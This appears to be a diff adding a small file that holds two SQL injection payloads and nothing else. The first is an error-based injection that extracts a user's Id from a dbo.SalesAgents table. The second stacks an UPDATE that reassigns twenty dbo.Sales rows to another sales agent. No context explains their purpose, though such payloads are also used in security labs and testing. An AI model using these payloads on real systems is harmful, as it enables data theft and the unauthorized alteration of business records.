@@ -1,0 +1,10 @@
+
+
+
+' OR 0=(SELECT CAST(Id AS varchar(10))+'****' FROM dbo.SalesAgents WHERE UserName='ali') --
+
+
+
+' AND 1=0; UPDATE TOP (20) dbo.Sales SET SalesAgentId=1006; --
+
+
